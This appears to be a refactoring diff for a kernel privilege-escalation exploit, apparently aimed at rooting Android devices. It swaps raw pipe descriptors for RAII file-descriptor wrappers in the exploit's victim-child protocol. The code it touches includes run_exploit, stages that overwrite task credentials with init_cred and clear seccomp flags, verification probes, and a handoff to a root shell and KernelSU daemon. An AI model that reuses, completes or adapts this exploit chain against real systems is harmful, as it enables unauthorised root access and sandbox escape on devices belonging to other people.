@@ -979,8 +979,17 @@ static uintptr_t perf_find_task(void) {
     return best;
 }
 
+/* Owns the six pipe ends of the victim protocol. The child-side ends are
+ * closed by the fork child before child_main runs; the parent-side ends are
+ * closed once their protocol step is done. parked_cmd_w below receives the
+ * cmd write end by move when a rooted child is parked across W3 rounds. */
 struct child_pipes {
-    int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w;
+    ghostlock::UniqueFd task_read;
+    ghostlock::UniqueFd cmd_write;
+    ghostlock::UniqueFd uid_read;
+    ghostlock::UniqueFd task_write;
+    ghostlock::UniqueFd cmd_read;
+    ghostlock::UniqueFd uid_write;
 };
 
 /* rooted exits kfree the static init_cred (w2 stores it with no
@@ -1001,11 +1010,11 @@ static void park_rooted_child(void) {
  * Input: owned pipe endpoints plus runtime config; output: reports/child exit.
  * Future: victim_child_run(VictimContext *), with explicit fd ownership. */
 static void child_main(struct child_pipes *p) {
-    close(p->task_r);
-    close(p->cmd_w);
-    close(p->uid_r);
+    p->task_read.reset();
+    p->cmd_write.reset();
+    p->uid_read.reset();
     setpgid(0, 0);  /* own group; the parent kills the whole tree on timeout */
-    fcntl(p->uid_w, F_SETFD, FD_CLOEXEC);  /* keep the probe pipe out of the
+    fcntl(p->uid_write.get(), F_SETFD, FD_CLOEXEC);  /* keep the probe pipe out of the
                                           * root shell / ksud chain */
     prctl(PR_SET_NAME, "ghostleaf_0123456789");
     /* a real leak reproduces, a fluke vote winner does not. w2 writes to
@@ -1021,14 +1030,14 @@ static void child_main(struct child_pipes *p) {
         my_task = again;
     }
     if (!leak_agreed) my_task = 0;
-    write(p->task_w, &my_task, sizeof(my_task));
-    close(p->task_w);
+    write(p->task_write.get(), &my_task, sizeof(my_task));
+    p->task_write.reset();
     if (!my_task) _exit(1);
     char cmd;
-    while (read(p->cmd_r, &cmd, 1) == 1) {
+    while (read(p->cmd_read.get(), &cmd, 1) == 1) {
         if (cmd == 'C') {
             uint32_t uid = getuid();
-            write(p->uid_w, &uid, sizeof(uid));
+            write(p->uid_write.get(), &uid, sizeof(uid));
         } else if (cmd == 'F') {
             /* Forked finit_module probe after W3 cleared TIF_SECCOMP and
              * seccomp.mode: mode==2 re-arms TIF_SECCOMP on fork (probe hits the
@@ -1059,7 +1068,7 @@ static void child_main(struct child_pipes *p) {
                 }
                 close(probe_pipe[0]);
             }
-            write(p->uid_w, &code, sizeof(code));
+            write(p->uid_write.get(), &code, sizeof(code));
         } else if (cmd == 'M') {
             /* Report comm length + first byte to tell which side a leaf=1 write
              * landed: comm "ghostleaf_012345" zeroed at [target] reads len 0, at
@@ -1079,20 +1088,20 @@ static void child_main(struct child_pipes *p) {
             uint32_t report =
                     ((uint32_t) len << 8) | (uint32_t)(unsigned char)
             comm[0];
-            write(p->uid_w, &report, sizeof(report));
+            write(p->uid_write.get(), &report, sizeof(report));
         } else if (cmd == 'P') {
             /* w2 rooted this task; park */
-            close(p->cmd_r);
-            close(p->uid_w);
+            p->cmd_read.reset();
+            p->uid_write.reset();
             park_rooted_child();
         } else if (cmd == 'G' || cmd == 'X') {
             pr_info("handoff: root script path=%s\n", g_root_script_path);
             break;
         }
     }
-    close(p->cmd_r);
+    p->cmd_read.reset();
     if (getuid() != 0) {
-        close(p->uid_w);
+        p->uid_write.reset();
         _exit(1);
     }
     /* Don't leak app-side fds into the root shell chain: ksud/zygisk
@@ -1126,11 +1135,11 @@ static void child_main(struct child_pipes *p) {
     pr_info("handoff: root shell worker pid=%d\n", worker);
     if (worker < 0) {
         pr_warning("fork() for root shell failed errno=%d; parking rooted child\n", errno);
-        close(p->uid_w);
+        p->uid_write.reset();
         park_rooted_child();
     }
     /* the worker holds a fresh cred copy; this task holds the raw init_cred */
-    close(p->uid_w);
+    p->uid_write.reset();
     park_rooted_child();
 }
 
@@ -1139,21 +1148,21 @@ static void child_main(struct child_pipes *p) {
 static pid_t spawn_child(struct child_pipes *p) {
     int p1[2], p2[2], p3[2];
     if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
-    p->task_r = p1[0];
-    p->task_w = p1[1];
-    p->cmd_r = p2[0];
-    p->cmd_w = p2[1];
-    p->uid_r = p3[0];
-    p->uid_w = p3[1];
+    p->task_read.reset(p1[0]);
+    p->task_write.reset(p1[1]);
+    p->cmd_read.reset(p2[0]);
+    p->cmd_write.reset(p2[1]);
+    p->uid_read.reset(p3[0]);
+    p->uid_write.reset(p3[1]);
     pid_t child = fork();
     if (child < 0) return -1;
     if (child == 0) {
         child_main(p);
         _exit(1);
     }
-    close(p->task_w);
-    close(p->cmd_r);
-    close(p->uid_w);
+    p->task_write.reset();
+    p->cmd_read.reset();
+    p->uid_write.reset();
     return child;
 }
 
@@ -1165,8 +1174,8 @@ static pid_t spawn_victim(struct child_pipes *p, uintptr_t *task_out) {
     pid_t child = spawn_child(p);
     if (child < 0) return -1;
     uintptr_t task = 0;
-    ssize_t nr = read(p->task_r, &task, sizeof(task));
-    close(p->task_r);
+    ssize_t nr = read(p->task_read.get(), &task, sizeof(task));
+    p->task_read.reset();
     *task_out = (nr == (ssize_t)
     sizeof(task)) ? task :
     0;
@@ -1275,10 +1284,10 @@ struct w3_stage_context {
  * W2 context; output: boolean/status. Future: stage_verify_credentials(). */
 static int verify_w2_stage(void *context) {
     auto *stage = static_cast<struct w2_stage_context *>(context);
-    if (write(stage->pipes->cmd_w, "C", 1) != 1) return 0;
+    if (write(stage->pipes->cmd_write.get(), "C", 1) != 1) return 0;
 
     uint32_t child_uid = 9999;
-    if (read(stage->pipes->uid_r, &child_uid, sizeof(child_uid)) !=
+    if (read(stage->pipes->uid_read.get(), &child_uid, sizeof(child_uid)) !=
             (ssize_t)
         sizeof(child_uid)) {
         return 0;
@@ -1293,10 +1302,10 @@ static int verify_w2_stage(void *context) {
  * output: boolean/status. Future: stage_verify_seccomp(). */
 static int verify_seccomp_probe_stage(void *context) {
     auto *stage = static_cast<struct w2_stage_context *>(context);
-    if (write(stage->pipes->cmd_w, "F", 1) != 1) return 0;
+    if (write(stage->pipes->cmd_write.get(), "F", 1) != 1) return 0;
 
     uint32_t code = 0;
-    if (read(stage->pipes->uid_r, &code, sizeof(code)) !=
+    if (read(stage->pipes->uid_read.get(), &code, sizeof(code)) !=
             (ssize_t)
         sizeof(code)) {
         return 0;
@@ -1318,10 +1327,10 @@ static int verify_seccomp_probe_stage(void *context) {
  * select_stack_verify_leaf_direction(), storing result in its route context. */
 static int verify_leaf_dir_stage(void *context) {
     auto *stage = static_cast<struct w3_stage_context *>(context);
-    if (write(stage->pipes->cmd_w, "M", 1) != 1) return 0;
+    if (write(stage->pipes->cmd_write.get(), "M", 1) != 1) return 0;
 
     uint32_t report = 0;
-    if (read(stage->pipes->uid_r, &report, sizeof(report)) !=
+    if (read(stage->pipes->uid_read.get(), &report, sizeof(report)) !=
             (ssize_t)
         sizeof(report)) {
         return 0;
@@ -1493,7 +1502,7 @@ int run_exploit(int argc, char **argv) {
     int seccomp_ok = 0;
     int ever_rooted = 0;
     pid_t parked_child = -1;
-    int parked_cmd_w = -1;
+    ghostlock::UniqueFd parked_cmd_w;
 
     /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
      * child, so respawn and redo. */
@@ -1503,14 +1512,14 @@ int run_exploit(int argc, char **argv) {
             pr_warning("W3 chain retry %d/%d: parking rooted child\n",
                     round, chain_rounds);
             if (child > 0 && child_alive) {
-                write(pipes.cmd_w, "P", 1);
+                write(pipes.cmd_write.get(), "P", 1);
                 usleep(50000);
                 parked_child = child;
-                parked_cmd_w = pipes.cmd_w;
+                parked_cmd_w = std::move(pipes.cmd_write);
             } else {
-                close(pipes.cmd_w);
+                pipes.cmd_write.reset();
             }
-            close(pipes.uid_r);
+            pipes.uid_read.reset();
             child_alive = 1;
             seccomp_ok = 0;
         }
@@ -1529,8 +1538,8 @@ int run_exploit(int argc, char **argv) {
             waitpid(child, NULL, 0);
 
             child_alive = 0;
-            close(pipes.cmd_w);
-            close(pipes.uid_r);
+            pipes.cmd_write.reset();
+            pipes.uid_read.reset();
             continue;
 
         }
@@ -1601,9 +1610,9 @@ int run_exploit(int argc, char **argv) {
                 execution_settings()->w2_settle_us,
                 verify_w2_stage, &w2_context, 0);
         if (!got_root) {
-            write(pipes.cmd_w, "X", 1);
-            close(pipes.cmd_w);
-            close(pipes.uid_r);
+            write(pipes.cmd_write.get(), "X", 1);
+            pipes.cmd_write.reset();
+            pipes.uid_read.reset();
             pr_warning("W2 failed after %u rounds\n",
                     execution_settings()->w2_attempts);
             waitpid(child, NULL, WNOHANG);
@@ -1705,24 +1714,23 @@ int run_exploit(int argc, char **argv) {
     }
     if (child_alive) {
         errno = 0;
-        const ssize_t sent = write(pipes.cmd_w, "G", 1);
+        const ssize_t sent = write(pipes.cmd_write.get(), "G", 1);
         pr_info("handoff: child=%d alive=%d sent=%zd errno=%d\n", child,
                 child_alive, sent, errno);
         if (sent != 1)
             pr_warning("failed to start root shell (child exited early)\n");
-        close(pipes.cmd_w);
+        pipes.cmd_write.reset();
         waitpid(child, NULL, WNOHANG);
-        if (parked_cmd_w >= 0) close(parked_cmd_w);
+        parked_cmd_w.reset();
     } else if (parked_child > 0) {
-        if (write(parked_cmd_w, "G", 1) != 1)
+        if (write(parked_cmd_w.get(), "G", 1) != 1)
             pr_warning("failed to start root shell (parked child exited)\n");
-        close(parked_cmd_w);
+        parked_cmd_w.reset();
         waitpid(parked_child, NULL, WNOHANG);
-        parked_cmd_w = -1;
     } else {
         pr_warning("skipping late-load: child died during W3\n");
     }
-    close(pipes.uid_r);
+    pipes.uid_read.reset();
 
     int kernelsu_ready = 0;
     for (uint32_t i = 0;
